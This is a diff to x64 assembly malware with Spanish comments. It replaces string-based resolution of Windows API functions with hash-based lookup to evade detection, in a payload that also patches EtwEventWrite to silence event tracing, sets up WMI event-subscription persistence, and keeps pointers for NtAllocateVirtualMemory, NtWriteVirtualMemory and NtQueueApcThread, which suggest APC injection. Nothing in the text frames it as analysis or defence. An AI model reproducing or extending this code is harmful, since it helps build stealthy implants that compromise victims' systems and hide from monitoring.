@@ -79,39 +79,23 @@ _start:
     call .get_export_by_hash_loader
     mov r13, rax                ; r13 = GetProcAddress
 
-    ; --- Resolver CreateFileA ---
-    push 0x6946657461657243
-    push 0x000000000041656C
-    push 0
-    mov rdx, rsp
-    add rdx, 16
+    ; --- Resolver CreateFileA por Hash ---
     mov rcx, r14
-    call r13
+    mov edx, __HASH_CreateFileA__
+    call .get_export_by_hash_loader
     mov r12, rax                ; r12 = CreateFileA
-    add rsp, 24
 
-    ; --- Resolver CreateFileMappingA ---
-    push 0x6946657461657243
-    push 0x6E697070614D656C
-    push 0x0000000000004167
-    push 0
-    mov rdx, rsp
-    add rdx, 24
+    ; --- Resolver CreateFileMappingA por Hash ---
     mov rcx, r14
-    call r13
-    mov r12, rax                ; r12 = CreateFileMappingA
-    add rsp, 32
+    mov edx, __HASH_CreateFileMappingA__
+    call .get_export_by_hash_loader
+    mov [rbx + (pCreateFileMappingA - payload_start)], rax
 
-    ; --- Resolver MapViewOfFile ---
-    push 0x4F7765695670614D
-    push 0x000000656C694666
-    push 0
-    mov rdx, rsp
-    add rdx, 16
+    ; --- Resolver MapViewOfFile por Hash ---
     mov rcx, r14
-    call r13
-    mov r12, rax                ; r12 = MapViewOfFile
-    add rsp, 24
+    mov edx, __HASH_MapViewOfFile__
+    call .get_export_by_hash_loader
+    mov [rbx + (pMapViewOfFile - payload_start)], rax
 
     ; --- Abrir C:\Windows\System32\cryptbase.dll ---
     push 0x6F646E69575C3A43
@@ -144,7 +128,7 @@ _start:
     push 0
     push 0
     sub rsp, 0x20
-    call r12                    ; CreateFileMappingA
+    call qword [rbx + (pCreateFileMappingA - payload_start)]
     add rsp, 0x30
     mov r12, rax                ; r12 = hMapping
     test r12, r12
@@ -157,7 +141,7 @@ _start:
     xor r9d, r9d
     push 0
     sub rsp, 0x20
-    call r12                    ; MapViewOfFile
+    call qword [rbx + (pMapViewOfFile - payload_start)]
     add rsp, 0x28
     mov r12, rax                ; r12 = mapped base
     test r12, r12
@@ -296,29 +280,19 @@ payload_entry:
     mov r13, rax                ; r13 = GetProcAddress
 
     ; --- SUPRESION ETW (EtwEventWrite -> ret) ---
-    push 0x746E657645777445
-    push 0x0000006574697257
-    push 0
-    mov rdx, rsp
-    add rdx, 16
     mov rcx, r15
-    call r13
-    add rsp, 24
+    mov edx, __HASH_EtwEventWrite__
+    call .get_export_by_hash_payload
     test rax, rax
     jz .skip_etw
     mov byte [rax], 0xC3
 .skip_etw:
 
     ; --- Resolver LoadLibraryA ---
-    push 0x7262694C64616F4C
-    push 0x0000000041797261
-    push 0
-    mov rdx, rsp
-    add rdx, 16
     mov rcx, r14
-    call r13
+    mov edx, __HASH_LoadLibraryA__
+    call .get_export_by_hash_payload
     mov [rbx + (pLoadLibraryA - payload_start)], rax
-    add rsp, 24
 
     ; --- Cargar ole32.dll ---
     push 0x00003233656C6F
@@ -329,28 +303,16 @@ payload_entry:
     add rsp, 16
 
     ; --- Resolver CoInitializeEx ---
-    push 0x7A79654D657A6974
-    push 0x0000007845696E49
-    push 0x6F43206F74
-    push 0
-    mov rdx, rsp
-    add rdx, 24
     mov rcx, r12
-    call r13
+    mov edx, __HASH_CoInitializeEx__
+    call .get_export_by_hash_payload
     mov [rbx + (pCoInitializeEx - payload_start)], rax
-    add rsp, 32
 
     ; --- Resolver CoCreateInstance ---
-    push 0x74736E654964616F
-    push 0x657A694D6F437963
-    push 0x00006F43206F74
-    push 0
-    mov rdx, rsp
-    add rdx, 24
     mov rcx, r12
-    call r13
+    mov edx, __HASH_CoCreateInstance__
+    call .get_export_by_hash_payload
     mov [rbx + (pCoCreateInstance - payload_start)], rax
-    add rsp, 40
 
     ; --- Cargar oleaut32.dll ---
     push 0x33747561656C6F
@@ -361,15 +323,10 @@ payload_entry:
     add rsp, 16
 
     ; --- Resolver SysAllocString ---
-    push 0x72754274696C6C41
-    push 0x000000797353
-    push 0
-    mov rdx, rsp
-    add rdx, 16
     mov rcx, r12
-    call r13
+    mov edx, __HASH_SysAllocString__
+    call .get_export_by_hash_payload
     mov [rbx + (pSysAllocString - payload_start)], rax
-    add rsp, 24
 
     ; =====================================================================
     ; FASE 1: PERSISTENCIA CIM (WMI Event Subscription)
@@ -758,6 +715,8 @@ pCoInitializeEx               dq 0
 pCoCreateInstance             dq 0
 pSysAllocString               dq 0
 pWbemLocator                  dq 0
+pCreateFileMappingA           dq 0
+pMapViewOfFile                dq 0
 pNtAllocateVirtualMemory      dq 0
 pNtWriteVirtualMemory         dq 0
 pNtQueueApcThread             dq 0
